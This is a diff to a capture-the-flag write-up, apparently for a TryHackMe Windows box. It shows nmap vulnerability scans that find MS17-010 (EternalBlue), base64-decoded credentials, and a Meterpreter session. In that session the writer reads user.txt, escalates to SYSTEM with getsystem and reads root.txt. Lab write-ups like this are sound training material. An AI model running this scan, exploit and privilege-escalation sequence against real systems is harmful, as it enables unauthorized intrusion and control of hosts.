@@ -83,6 +83,53 @@ Interesting points here:
   - user account guest is available  
 - RDP port 3389 open
 
+Closer look for vulberabilities with vulners and vuln script. Only vuln showed results:
+```
+$ nmap -Pn -sV -sC -script=vuln THM_Target
+...
+Mostly same as before
+...
+Host script results:
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+```
+Interesting points here
+- ms17-010 definitely has a RCE capability, eternal blue (CVE-2017-0143)
+
+Nmap -sC only includes a range of common ports so one more for full range of ports
+```
+└─$ nmap -Pn -p- -sV THM_Target 
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-16 04:36 AEST
+Nmap scan report for THM_Target (10.49.137.106)
+Host is up (0.41s latency).
+Not shown: 65527 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+49663/tcp open  http          Microsoft IIS httpd 10.0
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+```
+In browser the IP showed a just a basic IIS web server default page. GoBuster here no directories were discovered on port 80 for website. A second scan for port 49663.
+
 ## Starting now with SMB
 
 First see what shares are quickly available:
@@ -131,6 +178,7 @@ Bob - !P@$$W0rD!123
 └─$ echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d    
 Bill - Juw4nnaM4n420696969!$$$                        
 ```
+Tried an admin hidden shares but no username, either password wont work here on SMB shares at least.
 Closer look with nmap using script on port 135,139,445:
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-16 03:15 AEST
@@ -172,4 +220,49 @@ Host script results:
 |   Workgroup: WORKGROUP\x00
 |_  System time: 2026-05-15T10:15:09-07:00
 ```
-  
+
+
+Meterpreter results
+```
+meterpreter > shell
+Process 972 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv>cd /users/Bob/Desktop
+
+c:\Users\Bob\Desktop>type user.txt
+THM{fdk4ka34vk346ksxfr21tg789ktf45}
+c:\Users\Bob\Desktop>exit
+
+#ESCALATE
+
+meterpreter > getsystem
+...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
+meterpreter > whoami
+[-] Unknown command: whoami. Run the help command for more details.
+meterpreter > shell
+Process 3532 created.
+Channel 2 created.
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv>cd /users/Administrator/Desktop
+
+c:\Users\Administrator\Desktop>dir
+
+ Volume in drive C has no label.
+ Volume Serial Number is AC3C-5CB5
+
+ Directory of c:\Users\Administrator\Desktop
+
+07/25/2020  08:24 AM    <DIR>          .
+07/25/2020  08:24 AM    <DIR>          ..
+07/25/2020  08:25 AM                35 root.txt
+               1 File(s)             35 bytes
+               2 Dir(s)  20,880,105,472 bytes free
+
+c:\Users\Administrator\Desktop>type root.txt
+THM{1fk5kf469devly1gl320zafgl345pv}
+```
